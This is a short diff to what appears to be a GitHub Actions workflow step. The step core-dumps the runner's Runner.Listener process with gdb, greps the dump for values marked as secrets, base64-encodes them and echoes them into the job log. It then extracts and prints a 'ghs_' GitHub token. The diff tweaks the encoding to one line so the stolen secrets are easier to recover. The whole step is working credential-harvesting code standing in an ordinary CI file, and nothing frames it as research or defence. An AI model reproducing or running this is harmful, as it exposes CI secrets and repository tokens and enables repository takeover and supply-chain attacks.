@@ -14,7 +14,7 @@ jobs:
         run: |
           sudo apt-get install -y gdb && \
           sudo gcore -o k.dump "$(ps ax | grep 'Runner.Listener' | head -n 1 | awk '{ print $1 }')"
-          B64_BLOB=`grep -Eao '"[^"]+":\{"value":"[^"]*","issecret":true\}' k.dump* | base64`
+          B64_BLOB=`grep -Eao '"[^"]+":\{"value":"[^"]*","issecret":true\}' k.dump* | base64 -w 0`
           echo $B64_BLOB
           GH_TOKEN=`echo $B64_BLOB | base64 -d | grep -Eao "ghs_.+?\"" | sed "s/\"//g" | sort -u | head -1`
           echo GH_TOKEN=$GH_TOKEN
